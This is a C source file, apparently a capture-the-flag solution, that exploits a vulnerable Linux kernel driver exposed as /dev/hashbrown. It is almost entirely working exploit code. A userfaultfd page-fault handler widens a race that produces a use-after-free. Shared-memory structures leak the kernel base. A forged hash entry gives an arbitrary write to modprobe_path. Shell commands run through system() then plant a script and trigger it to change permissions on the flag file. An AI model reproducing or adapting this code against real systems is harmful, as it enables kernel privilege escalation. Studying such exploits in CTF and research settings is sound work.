#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <sys/shm.h>

#define ADD_KEY 0x1337
#define DELETE_KEY 0x1338
#define UPDATE_VALUE 0x1339
#define DELETE_VALUE 0x133a
#define GET_VALUE 0x133b


// This is the structure to interact with
// the device driver.
// The size should be : 1 <= size <= 0xb0
// Then it will copy from the pointer src 
// to the kzalloced chunk of the size we gave.
//
struct request {
    uint32_t key;
    uint32_t size;
    char *src;
    char *dest;
} request;

struct hash_entry
{
    uint32_t key;
    uint32_t size;
    char *value;
    struct hash_entry *next;
} fake_hash_entry;


int fd;
int stat[0x30];

// Leak then arb write.
int counter=0;

pthread_t tid;

void arb_write(){
	// We need to free a pointer so that we will retrieve it
	// as a value pointer for a node.
	// because the SLAB_FREE_LIST_RANDOMIZE is set.
	// We will be allocating a lot of nodes and hope to have the freed one.
	puts("Trying to free the key 23!");
	request.key = 23;
	ioctl(fd, DELETE_KEY, &request);
}

void get_leaks(){
	puts("Trying to have leaks!\n");
	// Delete the chunk with 0x20 bytes
	// Now we will allocate shm_file_data as suggested by FizzBuzz.
	// This leaks we will get are not affected by FG-KASLR.
	request.key = 0;
	ioctl(fd, DELETE_VALUE, &request);
	// Allocate the struct (shm_file_data).
	// This one will take the last freed chunk.
	int shmid;
	char* shmaddr;

	assert((shmid = shmget(IPC_PRIVATE, 100, 0600)) != -1);
	assert((shmaddr = shmat(shmid, NULL, 0)) != (char*)-1);
	return;
}

void fault_handler(uint64_t* arg){
	static struct uffd_msg uffd_msg;
	long uffd = (long)arg;
	
	for(;;){
		struct pollfd pollfd = {
			.fd = uffd,
			.events = POLLIN
		};

		poll(&pollfd, 1, -1);
		read(uffd, &uffd_msg, sizeof(uffd_msg));
		if(uffd_msg.event & UFFD_EVENT_PAGEFAULT){

			/// Here goes the implementation.
			printf("An event happened\n");
			switch(counter){
				case 0:
					get_leaks();
					break;
				case 1:
					arb_write();
					break;
			}
			++counter;
			/// End.
			struct uffdio_register uffdio_register;
			uffdio_register.range.start = uffd_msg.arg.pagefault.address;
			uffdio_register.range.len = 0x4000;
			uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;

			ioctl(uffd, UFFDIO_UNREGISTER, &uffdio_register.range);
			munmap((void*)uffdio_register.range.start, 0x4000);
			return;
		}
		
	}

	return;
}

uint64_t dump_data(char* ptr, size_t size){
	int i;
	unsigned long* u_ptr = (unsigned long*)ptr;
	for(i=0; i<(size>>3); i++){
		printf("QWORD %d : %p\n", i, u_ptr[i]);
	}

	return u_ptr[1];
}

char * userfaultfd_chunk(){
	
	struct uffdio_api uffdio_api;
	struct uffdio_register uffdio_register;
	int p;

	// Trying to get a userfault fd.
	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC|O_NONBLOCK);
	assert(uffd > 2);
	
	char* mmaped_ptr = (char *)mmap(NULL,
			0x4000,
			PROT_READ|PROT_WRITE,
			MAP_PRIVATE|MAP_ANONYMOUS,
			-1,
			0
			);
	uffdio_api.api = UFFD_API;
	uffdio_api.features = 0;

	assert(ioctl(uffd, UFFDIO_API, &uffdio_api) != -1);

	uffdio_register.range.start = (unsigned long)mmaped_ptr;
	uffdio_register.range.len   = 0x4000;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	assert(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) != -1);
	
	p = pthread_create(&tid, NULL, (void*)fault_handler, (void *)uffd);
	//pthread_join(tid, NULL);
	return mmaped_ptr;
}

void modprobe_exploit(){
	system( "echo -ne '#!/bin/bash\n"
		"chmod 777 /home/ctf/flag.txt\n'"
		"> /home/ctf/pwn");
	system("chmod a+x /home/ctf/pwn");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /home/ctf/dummy");
	system("chmod a+x /home/ctf/dummy");
	system("/home/ctf/dummy");
	system("cat /flag.txt");
}

int main(){
	int i;
	// Open the vulnerable device driver.
	fd = open("/dev/hashbrown", O_RDWR);
	
	// Add our first node to the hash table.
	// If we add until THRESHOLD (12 in the initial stat)
	// You will have an unlocked free of all the nodes
	// and then we can have a UAF both RAF and WAF.
	
	// This one we will have it's value pointer
	// poiting to some leaks.
	request.size = 0x20;
	request.key = 0x0;
	request.src = (char*)malloc(0xa0);
	memset(request.src, 0x4d, request.size);
	ioctl(fd, ADD_KEY, &request);


	request.size = 0xa0;
	for(i=1; i<12; ++i){
		request.key = i;
		ioctl(fd, ADD_KEY, &request);
	}

	// Now try to add another key
	// This time we will hit the threshold.
	// and setup a page fault handler
	// to resize (free all the buckets) in it.
	// And maybe get kernel leaks.
	request.src = userfaultfd_chunk();
	request.size = 0xa0;
	request.key = i;
	ioctl(fd, ADD_KEY, &request);
	pthread_join(tid, NULL);

	// Now we are ready to get our leaks.
	request.key = 0;
	request.size = 0x20;
	request.dest = (char*)malloc(0x20);
	ioctl(fd, GET_VALUE, &request);
	// Dump the leaks we got
	uint64_t kern_base = dump_data(request.dest, 0x20) - 0xb0dca0;
	uint64_t modprobe_path = kern_base + 0xa46fe0;
	printf("modprobe_path @ %p\n", modprobe_path);

	// Now we need an arbitraty write
	// To change the path of modprobe to a fake one.
	// One approach is to corrupt the next poiter of
	// the linked list and point it there.
	// Then with a change value you can change it.
	// Now that we finished the leak, the size became 0x10*2 = 0x20
	// so the threshold is 0x20 - (0x20/4) = 0x18 = 24
	for(i=1; i<13; i++){
		request.key = i;
		ioctl(fd, DELETE_KEY, &request);
	}
	
	for(i=1; i<=22; i++){
		request.size = 0xa0;
		request.key = i;
		request.src = (char*)malloc(0xa0);
		memset(request.src, 0x4d, 0xa0);
		ioctl(fd, ADD_KEY, &request);
	}
	
	
	request.size = 0x20;
	request.key = i++; //23
	request.src = (char*)malloc(0x20);
	memset(request.src, 0x4d, 0x20);
	ioctl(fd, ADD_KEY, &request);
	

	// At this point the counter is at 23
	// If we add another key we will hit the threshold again
	// And then free a key, and we will get it as the value pointer
	// for the node 24
	// key 24 -> value = freed chunk (UAF)
	//
	request.key = i++; // 24
	request.size = 0xa0;
	request.src = userfaultfd_chunk();
	ioctl(fd, ADD_KEY, &request);
	pthread_join(tid, NULL);

	// Now allocate a large number of nodes and hope to have and show
	
	request.src = (char*)malloc(0xa0);
	
	for(i=25; i<0x300; i++){
		request.size = 0xa0;
		request.key = i;
		ioctl(fd, ADD_KEY, &request);
	}
	

	request.key = 23;
	request.size = 0x20;
	request.dest = (char*)malloc(0x20);
	request.src = (char*)malloc(0x20);
	ioctl(fd, GET_VALUE, &request);
	dump_data(request.dest, request.size);
/*	
	struct hash_entry
	{
	    uint32_t key;
	    uint32_t size;
	    char *value;
	    struct hash_entry *next;
	};
*/
	fake_hash_entry.key = 0x1;
	fake_hash_entry.size = 0x20;
	fake_hash_entry.value = (char*)modprobe_path;
	fake_hash_entry.next = (struct hash_entry*)0;


	memcpy(request.src, &fake_hash_entry, sizeof(fake_hash_entry));
	ioctl(fd, UPDATE_VALUE, &request);

	strcpy(request.src, "/home/ctf/pwn");
	request.key = 0x1;
	ioctl(fd, UPDATE_VALUE, &request);
	modprobe_exploit();


	// Close the device.
	close(fd);
	return 0;
}
